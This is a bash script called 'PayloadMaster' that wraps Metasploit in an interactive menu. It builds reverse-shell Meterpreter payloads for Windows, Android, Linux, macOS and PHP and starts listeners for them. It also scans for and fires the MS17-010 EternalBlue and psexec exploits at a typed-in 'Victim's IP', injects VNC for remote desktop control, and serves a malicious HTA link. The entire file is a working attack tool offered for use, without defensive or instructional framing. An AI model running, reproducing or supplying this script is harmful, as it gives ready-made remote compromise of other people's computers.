#!/bin/bash

resize -s 27 80
clear

ip=$(hostname -I | cut -d' ' -f1)

service postgresql start

function create_windows_payload {
  read -p "Enter the name of the payload (without extension): " payload_name
  read -p "Enter the payload LHOST [$ip]: " lhost_payload
  lhost_payload=${lhost_payload:-$ip}
  read -p "Enter the payload LPORT [4444]: " lport_payload
  lport_payload=${lport_payload:-4444}
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f exe > "$payload_name.exe"

  read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
  if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
    lhost_listener=$lhost_payload
    lport_listener=$lport_payload
  else
    read -p "Enter the listener LHOST: " lhost_listener
    read -p "Enter the listener LPORT: " lport_listener
  fi

  msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
}

function create_android_payload {
  read -p "Enter the name of the payload (without extension): " payload_name
  read -p "Enter the payload LHOST [$ip]: " lhost_payload
  lhost_payload=${lhost_payload:-$ip}
  read -p "Enter the payload LPORT [4444]: " lport_payload
  lport_payload=${lport_payload:-4444}
  msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload > "$payload_name.apk"

  read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
  if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
    lhost_listener=$lhost_payload
    lport_listener=$lport_payload
  else
    read -p "Enter the listener LHOST: " lhost_listener
    read -p "Enter the listener LPORT: " lport_listener
  fi

  msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
}

function create_linux_payload {
  read -p "Enter the name of the payload (without extension): " payload_name
  read -p "Enter the payload LHOST [$ip]: " lhost_payload
  lhost_payload=${lhost_payload:-$ip}
  read -p "Enter the payload LPORT [4444]: " lport_payload
  lport_payload=${lport_payload:-4444}
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f elf > "$payload_name.elf"

  read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
  if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
    lhost_listener=$lhost_payload
    lport_listener=$lport_payload
  else
    read -p "Enter the listener LHOST: " lhost_listener
    read -p "Enter the listener LPORT: " lport_listener
  fi

  msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
}

function create_macos_payload {
  read -p "Enter the name of the payload (without extension): " payload_name
  read -p "Enter the payload LHOST [$ip]: " lhost_payload
  lhost_payload=${lhost_payload:-$ip}
  read -p "Enter the payload LPORT [4444]: " lport_payload
  lport_payload=${lport_payload:-4444}
  msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f macho > "$payload_name.macho"

  read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
  if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
    lhost_listener=$lhost_payload
    lport_listener=$lport_payload
  else
    read -p "Enter the listener LHOST: " lhost_listener
    read -p "Enter the listener LPORT: " lport_listener
  fi

  msfconsole -q -x "use exploit/multi/handler; set payload osx/x86/shell_reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
}

function create_web_payload {
  read -p "Enter the name of the payload (without extension): " payload_name
  read -p "Enter the payload LHOST [$ip]: " lhost_payload
  lhost_payload=${lhost_payload:-$ip}
  read -p "Enter the payload LPORT [80]: " lport_payload
  lport_payload=${lport_payload:-80}
  msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f raw > "$payload_name.php"

  read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
  if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
    lhost_listener=$lhost_payload
    lport_listener=$lport_payload
  else
    read -p "Enter the listener LHOST: " lhost_listener
    read -p "Enter the listener LPORT: " lport_listener
  fi

  msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter_reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
}

function scan_vulnerable {
  echo "Victim's IP:"
  read r
  msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $r; exploit; exit;"
}

function exploit_windows {
  echo "Victim's IP:"
  read r
  msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $ip; set RHOST $r; exploit;"
}

function enable_remote_desktop {
  echo "Victim's IP:"
  read r
  msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp; set LHOST $ip; set RHOST $r; set viewonly false; exploit;"
}

function exploit_windows_psexec {
  echo "Victim's IP:"
  read r
  msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set LHOST $ip; set RHOST $r; exploit;"
}

function enable_remote_desktop_psexec {
  echo "Victim's IP:"
  read r
  msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp; set LHOST $ip; set RHOST $r; set viewonly false; exploit;"
}

function exploit_windows_hta {
  echo "Uripath: (/)"
  read u
  msfconsole -q -x "use exploit/windows/misc/hta_server; set SRVHOST $ip; set URIPATH /$u; set payload windows/meterpreter/reverse_tcp; set LHOST $ip; exploit;"
}

while true; do
  clear

  echo "==========================="
  echo "        PayloadMaster       "
  echo "==========================="
  echo "Select an option:"
  echo "  (1) Windows --> Create Windows payload and listener"
  echo "  (2) Android --> Create Android payload and listener"
  echo "  (3) Linux --> Create Linux payload and listener"
  echo "  (4) MacOS --> Create MacOS payload and listener"
  echo "  (5) Web --> Create Web payload and listener"
  echo "  (6) Scan if a target is vulnerable to ms17_010"
  echo "  (7) Exploit Windows 7/2008 x64 ONLY by IP (ms17_010_eternalblue)"
  echo "  (8) Enable Remote Desktop (ms17_010_eternalblue)"
  echo "  (9) Exploit Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec)"
  echo "  (10) Enable Remote Desktop (ms17_010_psexec)"
  echo "  (11) Exploit Windows with a link (HTA Server)"
  echo "  (q) Quit"
  read -p "Choice: " x

  case $x in
    1)
      create_windows_payload
      ;;
    2)
      create_android_payload
      ;;
    3)
      create_linux_payload
      ;;
    4)
      create_macos_payload
      ;;
    5)
      create_web_payload
      ;;
    6)
      scan_vulnerable
      ;;
    7)
      exploit_windows
      ;;
    8)
      enable_remote_desktop
      ;;
    9)
      exploit_windows_psexec
      ;;
    10)
      enable_remote_desktop_psexec
      ;;
    11)
      exploit_windows_hta
      ;;
    q)
      echo "Quitting..."
      exit 0
      ;;
    *)
      echo "Invalid option. Please try again."
      ;;
  esac
done
